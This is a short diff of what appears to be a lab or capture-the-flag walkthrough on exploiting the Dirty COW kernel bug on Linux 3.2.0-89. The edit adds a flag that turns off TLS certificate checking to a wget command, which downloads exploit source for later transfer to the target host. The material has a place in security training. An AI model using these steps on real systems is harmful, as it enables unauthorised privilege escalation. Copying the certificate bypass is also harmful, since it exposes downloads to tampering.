@@ -16,7 +16,7 @@ The linux kernel version 3.2.0-89-generic-pae is vulnerable to dirty cow exploit
 
 On client download the exploit source file:
 ```bash
-wget https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
+wget --no-check-certificate https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
 ```
 
 Copy the file on host:
